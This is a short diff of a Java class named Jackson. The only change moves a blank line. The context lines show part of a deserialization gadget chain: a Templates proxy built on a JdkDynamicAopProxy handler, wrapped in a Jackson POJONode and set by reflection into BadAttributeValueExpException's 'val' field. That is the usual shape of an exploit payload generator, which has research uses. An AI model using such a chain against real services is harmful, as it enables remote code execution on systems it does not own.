@@ -35,8 +35,8 @@ public class Jackson {
         InvocationHandler jdkDynamicAopProxyHandler = (InvocationHandler) constructor.newInstance(as);
 
         Templates templatesProxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, jdkDynamicAopProxyHandler);
-
         POJONode pojoNode = new POJONode(templatesProxy);
+
         BadAttributeValueExpException e = new BadAttributeValueExpException(null);
         ReflectUtil.setFieldValue(e, "val", pojoNode);
 
